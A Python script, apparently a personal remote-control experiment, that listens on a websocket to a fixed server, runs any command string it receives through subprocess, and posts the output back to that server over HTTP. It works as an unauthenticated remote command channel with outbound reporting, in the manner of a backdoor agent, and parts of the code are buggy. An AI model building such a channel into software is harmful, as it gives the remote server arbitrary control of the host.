
import os
import sys
import subprocess
import codecs
import time
import socket
import json
import urllib.parse
import httplib2 
import websocket
from ctypes import * #lock scren
try:
    import thread
except ImportError:  #TODO use Threading instead of _thread in python3
    import _thread as thread
import time
import sys

class MsgObj(object):
    def __init__(self, destination, content):
        self.destination = destination
        self.content = content
    def __repr__(self):
        return '<msgObj(%s)>' % self.destination


def sendHttpMsg(msg):   
    http = httplib2.Http()    
    url = 'http://hz2.byodwork.cn/base/cp/sendmsg'    
    # body = {'USERNAME': 'foo', 'PASSWORD': 'bar'}  
    body = {'msg': msg}
    headers = {'Content-type': 'application/x-www-form-urlencoded'}  
    response, content = http.request(url, 'POST', headers=headers, body=urllib.parse.urlencode(body)) 
    #response, content = http.request(url, method='GET', headers=headers, body=None)
    # print(content)
    # 将获得cookie设置到请求头中，以备下次请求使用  json.dumps(body)
    # headers = {'Cookie': response['set-cookie']}   


def sendMsg(destination, content):
    data1 = {'destination':destination,'content':content}
    d1 = json.dumps(data1)
    print(d1)
    ws.send(d1)

def handlerContent(content):
    if content == "date":
        #a=windll.LoadLibrary('user32.dll') 
        #a.LockWorkStation() 
        output=subprocess.check_output(['date'])
        # print(output.decode('utf-8'));
        sendHttpMsg(output.decode('utf-8'))	
    else:
        output=subprocess.check_output([content])
        sendHttpMsg(output.decode('utf-8'))
        print(content)

		
def on_message(ws, message):
    print(message)
    msgObj = json.loads(message)
    # print(msgObj["msgType"])
    if msgObj["msgType"] == "content":
        #print("This message is content")
        handlerContent(msgObj["content"])
    else:
        print("This message is status")


def on_error(ws, error):
    print(error)


def on_close(ws):
    print("### closed ###")


def on_open(ws):
    # data1 = {'destination':'/topic/vote/msg','content':'follow_cp'}
    sendMsg('/topic/vote/msg', 'vote')
    sendMsg('/topic/cp/msg/touser', 'touser')
    sendMsg('/topic/cp/msg/fromuser', 'fromuser')
    # ws.close()
    # thread.start_new_thread(run, ())
    #data3 = urllib.parse.urlencode({ 'name': 'nowamagic-gonn', 'age': 200 })
    # output=subprocess.check_output(['ls','-l'])
    # print(output.decode('utf-8'));

def theadFun():
    while True:
        #time.sleep(3)
        #output=subprocess.check_output(['date'])
        #sendHttpMsg(output.decode('utf-8'))
        #inStr = input("pls input cmd")
        print("before popen read")
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        conn = './tmp/conn'
        if not os.path.exists(conn):
            os.mknod(conn)
        if os.path.exists(conn):
            os.unlink(conn)
        sock.bind(conn)
        sock.listen(5)
        while True:
            connection,address = sock.accept()
            data = connection.recv(1024)
            print("rev data:"+data)
            connection.send("hello,client")
            connection.close() 
		
            print("after popen read")
            #sendHttpMsg(inStr)

		
if __name__ == "__main__":
    websocket.enableTrace(True)
    if len(sys.argv) < 2:
        host = "ws://hz2.byodwork.cn:8080/base/wsendpoint"
    else:
        host = sys.argv[1]
    ws = websocket.WebSocketApp(host,
                                on_message = on_message,
                                on_error = on_error,
                                on_close = on_close)
    ws.on_open = on_open
    thread.start_new_thread(theadFun, ())
    ws.run_forever()
